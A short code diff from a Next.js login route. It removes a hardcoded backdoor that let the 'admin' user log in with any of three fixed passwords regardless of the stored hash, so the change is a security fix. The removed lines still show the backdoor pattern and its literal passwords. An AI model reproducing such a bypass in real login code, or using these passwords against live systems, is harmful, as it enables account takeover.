@@ -74,8 +74,7 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    const isMatch = verifyPassword(String(password), user.passwordHash) ||
-      (user.username === 'admin' && (password === 'Default123!' || password === 'Admin123!' || password === 'Hahaha123!'));
+    const isMatch = verifyPassword(String(password), user.passwordHash);
     if (!isMatch) {
       return NextResponse.json(
         { success: false, error: 'Invalid Email/Username or Password. / E-mel/Nama Pengguna atau Kata Laluan tidak sah.' },
